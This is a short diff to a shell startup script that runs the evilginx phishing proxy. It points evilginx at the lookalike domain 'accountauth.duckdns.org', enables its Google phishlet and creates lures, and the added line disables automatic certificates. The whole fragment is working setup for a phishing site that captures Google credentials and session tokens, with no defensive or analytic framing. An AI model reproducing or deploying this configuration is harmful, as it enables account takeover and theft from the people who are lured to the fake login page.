@@ -7,6 +7,7 @@ socat TCP-LISTEN:${PORT:-8080},fork TCP:127.0.0.1:80 &
 script -q -c '/app/evilginx -p /app/phishlets' /dev/null <<EOF
 config domain accountauth.duckdns.org
 config ipv4 external 127.0.0.1
+config autocert off
 phishlets hostname google accountauth.duckdns.org
 phishlets enable google
 lures create google
